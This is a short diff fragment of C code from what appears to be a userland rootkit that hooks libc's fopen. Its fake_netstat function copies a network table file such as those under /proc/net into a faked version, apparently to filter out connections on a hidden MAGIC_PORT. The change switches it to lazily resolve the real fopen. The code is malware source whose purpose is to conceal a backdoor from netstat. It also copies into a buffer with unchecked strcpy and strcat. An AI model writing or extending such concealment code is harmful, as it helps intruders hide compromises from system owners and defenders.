@@ -61,15 +61,18 @@ int is_net_file(const char *pathname){
  *
  *  returns: 1 if works otherwise 0  
  */
-int fake_netstat(FILE *(*f)(const char *, const char *), char *pathname, char *newfile){
-    FILE *real_fp = f(pathname, "r");
+int fake_netstat(char *pathname, char *newfile){
+	if(!hooked_fopen){
+		hooked_fopen = load_libc("fopen");
+	}
+    FILE *real_fp = hooked_fopen(pathname, "r");
     if (!real_fp){
         return 0;
     }
     strcpy(newfile,FAKE_NETSTAT_FILE);
     char *proto = basename(pathname);
     strcat(newfile,proto);
-    FILE *fake_fp = f(newfile,"w");
+    FILE *fake_fp = hooked_fopen(newfile,"w");
     char hex_port[7]; 
     sprintf(hex_port, ":%04X ", MAGIC_PORT);
 
